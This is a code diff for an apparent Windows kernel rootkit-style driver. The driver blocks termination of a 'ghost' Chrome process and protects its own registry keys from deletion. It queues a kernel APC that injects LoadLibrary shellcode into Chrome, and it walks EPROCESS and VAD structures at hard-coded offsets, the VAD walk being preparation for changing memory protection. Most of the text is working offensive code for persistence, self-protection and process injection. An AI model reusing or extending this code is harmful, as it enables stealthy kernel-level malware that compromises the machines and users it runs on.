@@ -8,8 +8,9 @@ NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
 void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
 void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
-void InjectUsermodeShellcodeAPC(unsigned char* shellcode, SIZE_T shellcodeSize);
-bool FindProcessByName(CHAR* process_name, PEPROCESS* process);
+void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize);
+bool FindProcessByName(CHAR* Name, PEPROCESS* Process);
+bool ChangeVadEntryProtection(PEPROCESS Process, ULONG_PTR AllocationStartAddress, ULONG Protection);
 bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
 
 extern "C" NTSTATUS
@@ -18,7 +19,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 
 	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
 
-	// Build registration structures for shell process' protection
+	// Build registration structures for shell Process' protection
 	OB_OPERATION_REGISTRATION operations[] = {
 		{
 			PsProcessType,		        // object type
@@ -41,7 +42,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	bool symLinkCreated = false;
 
 	do {
-		status = IoCreateDevice(DriverObject, 0, &devName,
+		status = ::IoCreateDevice(DriverObject, 0, &devName,
 			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "[-] Failed to create device (status=0x%08X)\n",status));
@@ -49,7 +50,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 		}
 		DeviceObject->Flags |= DO_DIRECT_IO;
 
-		status = IoCreateSymbolicLink(&symLink, &devName);
+		status = ::IoCreateSymbolicLink(&symLink, &devName);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "[-] Failed to create sym link (status=0x%08X)\n",status));
 			break;
@@ -57,13 +58,13 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 		symLinkCreated = true;
 
 		// Register for object notifications
-		status = ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
+		status = ::ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "[-] Failed to register object callbacks (status=0x%08X)\n", status));
 			break;
 		}
 
-		status = CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
+		status = ::CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
 			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "failed to set registry callback (%08X)\n",
@@ -71,31 +72,32 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 			break;
 		}
 
-		// Register for thread notifications
-		status = PsSetCreateThreadNotifyRoutine(OnThreadNotify);
-		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "[-] Failed to set thread callbacks (status=status=%08X)\n", status));
-			break;
-		}
+		// Register for Thread notifications
+		//status = ::PsSetCreateThreadNotifyRoutine(OnThreadNotify);
+		//if (!NT_SUCCESS(status)) {
+		//	KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=status=%08X)\n", status));
+		//	break;
+		//}
 	} while (false);
 	if (!NT_SUCCESS(status)) {
 		if (symLinkCreated)
-			IoDeleteSymbolicLink(&symLink);
+			::IoDeleteSymbolicLink(&symLink);
 		if (DeviceObject)
-			IoDeleteDevice(DeviceObject);
+			::IoDeleteDevice(DeviceObject);
 	}
 
 	// Initialize RundownProtection for APCs
 	::ExInitializeRundownProtection(&g_Globals.RundownProtection);
 
-	// Search for explorer process
+	// Search for explorer Process
 	PEPROCESS explorerProcess;
 	LARGE_INTEGER interval;
-	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELETIVE time
+	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
 	do {
-		if (FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess)) {
+		if (::FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess)) {
 			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
 			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
+			//ChangeVadEntryProtection(explorerProcess, NULL, 0);
 			break;
 		}
 		else { 
@@ -113,21 +115,21 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 }
 
 void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
-	// unregister process & thread notifications in case of an error
-	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
-	PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
+	// unregister Process & Thread notifications in case of an error
+	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
+	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
 
 	// unregister object & registry notifications
-	ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
-	CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
+	::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
+	::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
 
 	// Wait for KAPC to finish in case of an error
 	::ExWaitForRundownProtectionRelease(&g_Globals.RundownProtection);
 
 	// Delete device
 	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\" DRIVER_NAME);
-	IoDeleteSymbolicLink(&symLink);
-	IoDeleteDevice(DriverObject->DeviceObject);
+	::IoDeleteSymbolicLink(&symLink);
+	::IoDeleteDevice(DriverObject->DeviceObject);
 
 	KdPrint((DRIVER_PREFIX "[+] Driver unloaded successfully\n"));
 }
@@ -154,7 +156,7 @@ NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
 	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1) {
 	case RegNtPreDeleteKey:
 		deleteKeyInfo = (REG_DELETE_KEY_INFORMATION*)Argument2;
-		if (NT_SUCCESS(CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteKeyInfo->Object, nullptr, &name, 0))) {
+		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteKeyInfo->Object, nullptr, &name, 0))) {
 
 			// filter out none-subzero deletions
 			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
@@ -164,7 +166,7 @@ NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
 		}
 	case RegNtPreDeleteValueKey:
 		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;
-		if (NT_SUCCESS(CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
+		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
 
 			// filter out none-subzero deletions
 			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
@@ -183,7 +185,7 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION I
 		return OB_PREOP_SUCCESS;
 
 	auto process = (PEPROCESS)Info->Object;
-	auto pid = HandleToULong(PsGetProcessId(process));
+	auto pid = ::HandleToULong(::PsGetProcessId(process));
 	if (pid == g_Globals.ChromePID) {
 		//  Remove terminate access
 		Info->Parameters->CreateHandleInformation.DesiredAccess &=
@@ -197,22 +199,22 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 	if (!Create) return;
 
 	PETHREAD thread;
-	ULONG pid = HandleToULong(ProcessId);
-	ULONG tid = HandleToULong(ThreadId);
+	ULONG pid = ::HandleToULong(ProcessId);
+	ULONG tid = ::HandleToULong(ThreadId);
 
-	// Search for an explorer thread
+	// Search for an explorer Thread
 	if (pid == g_Globals.ExplorerPID) {
 
-		// Check if a launcher thread was already found
+		// Check if a launcher Thread was already found
 		if (g_Globals.ExplorerLauncherThreadID != 0) return;
 
-		KdPrint((DRIVER_PREFIX "[+] explorer launcher thread catched. TID: %d\n", tid));
+		KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
 		g_Globals.ExplorerLauncherThreadID = tid;
 
-		// Register for process notifications in order to catch the ghost chrome launch
-		auto status = PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
+		// Register for Process notifications in order to catch the ghost chrome launch
+		auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "[-] Failed to register process callback (status=0x%08X)\n", status));
+			KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
 			return;
 		}
 
@@ -224,38 +226,40 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 		}
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
-	// Search for chrome's first thread
+	// Search for chrome's first Thread
 	else if (pid == g_Globals.ChromePID) {
 
-		// Check if the first thread was already found
+		// Check if the first Thread was already found
 		if (g_Globals.ChromeFirstThreadID != 0) return;
 
-		KdPrint((DRIVER_PREFIX "[+] chrome first thread catched. TID: %d\n", tid));
+		KdPrint((DRIVER_PREFIX "[+] chrome first Thread catched. TID: %d\n", tid));
 		g_Globals.ChromeFirstThreadID = tid;
 
 		// Queue APC for dll loading
 		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 
-			// Thread and process creation notification callbacks are not needed anymore - The APC will unregister them
+			// Thread and Process creation notification callbacks are not needed anymore - The APC will unregister them
 			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 																		::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
 																		InjectUsermodeShellcodeAPC(LoadLibraryShellcode, sizeof(LoadLibraryShellcode)); }))
 				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
+
+			
 		}
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
 }
 
 void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
-	// process creation only
+	// Process creation only
 	if (!CreateInfo) return;
 
-	auto pid = HandleToULong(ProcessId);
+	auto pid = ::HandleToULong(ProcessId);
 	if (g_Globals.ChromePID == 0) {
 
 		// Search for our ghost chrome 
-		if (HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
+		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
 			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
 			g_Globals.ChromePID = pid;
 			return;
@@ -263,7 +267,7 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 	}
 }
 
-bool FindProcessByName(CHAR* processName, PEPROCESS* process)
+bool FindProcessByName(CHAR* Name, PEPROCESS* Process)
 {
 	PEPROCESS initialSystemProcess = PsInitialSystemProcess;
 	PEPROCESS currentEntry = initialSystemProcess;
@@ -276,15 +280,15 @@ bool FindProcessByName(CHAR* processName, PEPROCESS* process)
 
 		//KdPrint((DRIVER_PREFIX "[*] %s\n", imageName));
 
-		if (strstr(imageName, processName))
+		if (strstr(imageName, Name))
 		{
 			ULONG activeThreads;
 			RtlCopyMemory((PVOID)&activeThreads, (PVOID)((uintptr_t)currentEntry + 0x498) /* EPROCESS->ActiveThreads */, sizeof(activeThreads));
 			if (activeThreads)
 			{
-				*process = currentEntry;
+				*Process = currentEntry;
 				//PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry) + 0x488); // EPROCESS->ThreadListHead
-				//*thread = (PKTHREAD)((uintptr_t)list->Flink - 0x6b8); // Same as CONTAINING_RECORD macro
+				//*Thread = (PKTHREAD)((uintptr_t)list->Flink - 0x6b8); // Same as CONTAINING_RECORD macro
 				return true;
 			}
 		}
@@ -299,7 +303,50 @@ bool FindProcessByName(CHAR* processName, PEPROCESS* process)
 
 }
 
-bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction) {
+//bool ChangeVadEntryProtection(PEPROCESS Process, ULONG_PTR AllocationStartAddress, ULONG Protection) {
+bool ChangeVadEntryProtection(PEPROCESS Process, ULONG_PTR, ULONG) {
+
+	//PEPROCESS* a = &Process;
+	PRTL_AVL_TABLE Table = (PRTL_AVL_TABLE)((uintptr_t)Process + 0x658);
+	
+	PMMVAD_SHORT Vad;
+	//ULONG VadCount;
+	//PMMADDRESS_NODE NewNode;
+	PVOID RestartKey = NULL;
+
+		//if (Vad->StartingVpn == AllocationStartAddress) {
+
+		//	ULONG_PTR flagsCopy = Vad->u.LongFlags;
+		//	ULONG shiftedProtection = flagsCopy >> 3;
+
+		//	InterlockedExchange((volatile LONG*)Vad->u.VadFlags.Protection, PAGE_EXECUTE_WRITECOPY);
+		//}
+		
+	KdPrint((DRIVER_PREFIX "[+] 1"));
+
+	for (Vad = (PMMVAD_SHORT)RtlEnumerateGenericTableAvl(Table, TRUE);
+		Vad != NULL;
+		Vad = (PMMVAD_SHORT)RtlEnumerateGenericTableAvl(Table, FALSE)) {
+
+		KdPrint((DRIVER_PREFIX "[+] Vad Starting Vpn -> (0x%p)\n", Vad->StartingVpn));
+
+	}
+
+	KdPrint((DRIVER_PREFIX "[+] 2"));
+
+	for (Vad = (PMMVAD_SHORT)RtlEnumerateGenericTableWithoutSplayingAvl(Table, &RestartKey);
+		Vad != NULL;
+		Vad = (PMMVAD_SHORT)RtlEnumerateGenericTableWithoutSplayingAvl(Table, &RestartKey)) {
+
+		KdPrint((DRIVER_PREFIX "[+] Vad Starting Vpn -> (0x%p)\n", Vad->StartingVpn));
+	}
+
+	
+
+	return true;
+}
+
+bool QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) {
 	PKAPC apc = (KAPC*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
 	if (!apc) {
 		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
@@ -308,13 +355,13 @@ bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunctio
 
 	::KeInitializeApc(
 		apc,
-		thread,
+		Thread,
 		OriginalApcEnvironment,
 		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
 		[](PKAPC apc) { ::ExFreePoolWithTag(apc, DRIVER_TAG); 
 						::ExReleaseRundownProtection(&g_Globals.RundownProtection); }, // Rundown APC
-		apcFunction, // Normal APC
-		mode,
+		ApcFunction, // Normal APC
+		Mode,
 		nullptr
 	);
 
@@ -336,13 +383,13 @@ bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunctio
 	}
 }
 
-void InjectUsermodeShellcodeAPC(unsigned char* shellcode, SIZE_T shellcodeSize) {
+void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) {
 	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));
 
-	SIZE_T pageAlligndShellcodeSize = shellcodeSize;
+	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
 	HANDLE hProcess = ZwCurrentProcess();
 
-	// Allocate shellcode's memory
+	// Allocate Shellcode's memory
 	void* address{};
 	auto status = ::ZwAllocateVirtualMemory(
 		hProcess,
@@ -412,13 +459,13 @@ void InjectUsermodeShellcodeAPC(unsigned char* shellcode, SIZE_T shellcodeSize) 
 		return;
 	}
 
-	// Copy shellcode
-	if (int errorCode = ::memcpy_s(mappedAddress, shellcodeSize, shellcode, shellcodeSize)) {
-		KdPrint((DRIVER_PREFIX "[-] Error copying shellcode to mapped address - (0x%px). Error code: (0x%08X)\n", mappedAddress, errorCode));
+	// Copy Shellcode
+	if (int errorCode = ::memcpy_s(mappedAddress, ShellcodeSize, Shellcode, ShellcodeSize)) {
+		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p). Error code: (0x%08X)\n", mappedAddress, errorCode));
 		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 		return;
 	}
-	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)shellcodeSize));
+	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
 
 	// Free MDL pages
 	::MmUnmapLockedPages(mappedAddress, mdl);
